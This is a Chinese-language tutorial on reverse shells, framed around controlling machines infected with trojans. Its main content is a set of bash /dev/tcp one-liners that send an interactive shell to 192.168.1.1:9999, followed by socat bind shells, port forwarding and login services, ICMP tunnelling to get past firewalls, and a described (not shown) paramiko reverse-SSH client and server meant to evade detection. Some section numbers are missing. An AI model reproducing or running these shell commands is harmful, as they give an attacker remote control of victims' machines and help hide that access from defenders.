一、 反弹shell

本地监听一个tcp/udp端口，被控端发起一个连接，并将其命令行的输入输出转到本机的过程

为什么要反弹shell

通常用于被控端因防火墙受限、权限不足、端口被占用等情形。

  1. 某客户机中了你的网马，但是它在局域网内，你直接连接不了。
  2. 目标机器的ip动态改变，你不能持续控制。
  3. 由于防火墙等限制，对方机器只能发送请求，不能接收请求。
  4. 对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机等情况都是未知的，所以建立一个服务端让恶意程序主动连接，才是上策。

反弹，攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。

bash版本

bash -i >& /dev/tcp/192.168.1.1/9999 0>&1

/bin/bash -i > /dev/tcp/192.168.1.1/9999 0<& 2>&1

exec 5<>/dev/tcp/192.168.1.1/9999;cat <&5 | while read line; do $line 2>&5 >&5; done

exec /bin/sh 0</dev/tcp/192.168.1.1/9999 1>&0 2>&0

0<&196;exec 196<>/dev/tcp/192.168.1.1/9999; sh <&196 >&196 2>&196

bash -i创建一个交互式的bash，&>将bash的标准输出重定向到/dev/tcp/192.168.1.1/9090的socket连接上，0>&1将标准输入重定向到标准输出；
最终的结果就是标准输入也被重定向到了TCP连接中，因此输入和输出都可以在公网主机上进行，通过TCP连接和bash进行交互

0 stdin_fileno 标准输入 键盘
1 stdout_fileno 标准输出 显示屏
2 stderr_fileno 标准错误

输入输出重定向

  1. 重定向输入就是在命令中指定具体的输入来源，譬如 cat < 1.txt
  2. 输出重定向是指定具体的输出目标以替换默认的标准输出 譬如 ls > 1.txt

    和>>的区别 >用于新建 而>>用于追加

  3. 2>&1& 用来将标准错误2重定向到标准输出1中
    此处1前面的&就是为了让bash将1解释成标准输出而不是文件1
    最后一个&，则是让bash在后台执行
  4. /dev/tcp/192.168.1.1/9999，这是一个特殊文件，它会建立一个连接到 192.168.1.1:9999 的socket

三、 socat

socat，是linux下的一个工具，其功能与有”瑞士军刀”之称的netcat类似，可以看做netcat的加强版。有一些netcat所不具备却又很有需求的功能，例如ssl连接

官网下载地址 http://www.dest-unreach.org/socat/

基本命令
socat [参数] <地址1> <地址2>

需要提供两个地址，然后socat把这两个地址的数据流串起来，左边地址的输出数据传给右边，同时把右边输出的数据传到左边；

支持TCP, TCP-LISTEN, UDP, UDP-LISTEN, OPEN, EXEC, SOCKS, PROXY 等多种协议，用于端口监听、链接，文件和进程读写，代理桥接等等

网络测试

类似 nc 的连通性测试，两台主机到底网络能否联通

socat - TCP-LISTEN:9999 终端1上启动 server 监听 TCP
socat - TCP:localhost:9999 终端2上启动 client 链接 TCP

因为两条命令都是把标准输入输出和网络串起来，因此把两个地址交换一下也是等价的

额外参数

socat - TCP-LISTEN:9999,fork,reuseaddr 终端1上启动 server
socat - TCP:localhost:9999 终端2上启动 client

fork参数，可以同时应答多个链接过来的客户端，每个客户端会fork一个进程出来进行通信；
reuseaddr参数，可以防止链接没断开 无法监听的问题；

端口转发

socat TCP-LISTEN:8080,fork,reuseaddr TCP:192.168.1.230:80

在主机上监听一个 8080 端口，将 8080 端口所有流量转发给远程机器的 80 端口，那么连到这台机器上 8080 端口的所有链接，相当于链接了 192.168.1.230 这台机器的 80 端口，命令中交换左右两个地址一样是等价的

nc做转发时只能转发1次，第一条链 accept 并且关闭以后 nc 就退出了，无法接受新链接，因此 nc 只适合单次使用；
而 socat 加上 fork 以后，每次都会 fork 出一份不影响接收其他的新连接，这样就可以当一个端口转发服务，一直启动在那里；

远程登录

类型 EXEC 可以执行程序并且把输入输出和另外一个地址串起来

socat TCP-LISTEN:8080,fork,reuseaddr EXEC:/usr/bin/bash,pty,stderr 服务端
socat file:tty,raw,echo=0 TCP:localhost:8080 客户端

可以把 bash 的标准错误重定向给标准输出，并且用终端模式运行；
客户端登录，还可以用 tty 的方式访问，这样基本就得到了一个全功能的交互式终端了，可以在里面运行 vim, emacs 之类的程序；

socat TCP-LISTEN:23,reuseaddr,fork,crlf exec:/bin/login,pty,setsid,setpgid,stderr,ctty

相当于在 23 端口启动了一个 telnetd 的服务，可以用 telnet 客户端来链接

网页服务

web.sh

用 SYSTEM 地址类型代替原来的 EXEC 执行命令

socat TCP-LISTEN:8080,fork,reuseaddr SYSTEM:”bash web.sh”

浏览器访问 http://localhost:8080

文件传输

socat -u TCP-LISTEN:8080 open:record.log,create 服务端接收文件
socat -u open:record.log TCP:localhost:8080 客户端发送文件

-u参数，数据从左边的地址单向传输到右边的地址；
-U参数大写，是从右边单向传输到左边；

透明代理

用于 socks 代理

socat TCP-LISTEN:<本地端口>,reuseaddr,fork SOCKS:<代理服务器IP>:<远程地址>:<远程端口>,socksport=<代理服务器端口>

用于 HTTP 代理

socat TCP-LISTEN:<本地端口>,reuseaddr,fork PROXY:<代理服务器IP>:<远程地址>:<远程端口>,proxyport=<代理服务器端口>

socat TCP-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678

链接本地 1234 端口，相当于通过代理服务器 127.0.0.1:5678 去链接 google.com 的 80 端口；
SOCKS4A，A是让代理服务器去解析域名；

四、 ICMP(icmpsh)协议反弹Shell

ICMP隧道是一个比较特殊的协议。在一般的通信协议里，如果两台设备要进行通信，肯定要开放端口，而在ICMP协议下就不需要。最常见的ICMP消息为Ping命令的回复，攻击者可以利用命令得到比回复更多的ICMP请求。在通常情况下，每个Ping命令都有相对应的回复与请求

在一些条件下，如果攻击者使用各类隧道技术（HTTP，DNS，常规正反端口转发等）操作都失败了，常常会通过ping命令访问远程计算机，尝试进行ICMP隧道，将TCP/UDP数据封装到ICMP的ping数据包中，从而穿过防火墙（通常防火墙不会屏蔽ping数据包），实现不受限制的网络访问

常见的ICMP隧道工具有：icmpsh、PingTunnel、icmptunnel、powershell icmp等

六、 python-ssh反向连接

应用场景

有很多时候我们都需要通过流量加密来避免检测，就比如使用ssh进行连接，但是在很多windows电脑中，是没有安装ssh客户端的，而我们用python便可以很轻易的完成一个ssh的客户端，当我们将客户端发送给对方主机后，我们可以在本地运行服务端，让远程的windows来连接我们运行的ssh服务端，我们在服务端输入命令，则客户端会将我们的命令执行并将命令执行结果返回给我们

安装

需要安装一个第三方模块，paramiko 可以通过pip直接下载安装

sudo apt install python3-pip

python3 -m pip install paramiko

客户端的代码

创建一个文件 ssh_client.py

python3 ssh_client.py 101.42.249.212

创建了一个ssh用来执行命令的函数，然后使用paramiko模块中的SSHClient创建一个ssh的客户端，然後设置保存目标ssh服务器的密钥。尝试根据输入的IP、端口、用户名和密码去连接我们的ssh服务器，当连接建立成功后，在后一行打开一个会话。最后给服务器随便发一个命令，告诉他我们连接成功了，然后等待服务器回应，服务器回应后，开启一个死循环，等待服务器传入命令，执行后发送执行结果返回给服务器。

因为paramiko模块的存在，我们还是可以狠狠轻易的完成这个ssh客户端，而不需要我们去从底层一点点点来写。

服务端的代码

创建一个文件 ssh_server.py

python3 ssh_server.py localhost 8001

首先是接受客户端请求的方法，会返回一个同意开启会话的方法，和一个用于验证用户名的账号和密码。然后在下面的代码中，尝试开始一个socket用来监听端口，如果收到了接受请求，那么接着往下走，我们会使用上面创建的客户端函数开启一个ssh管道并配置认证模式，当一个客户端认证成功并发回消息，然后就是循环接受用户在服务端输入的命令并发送个客户端，并将客户端命令执行结果返回给我们，知道用户输入exit，代表用户想要退出。
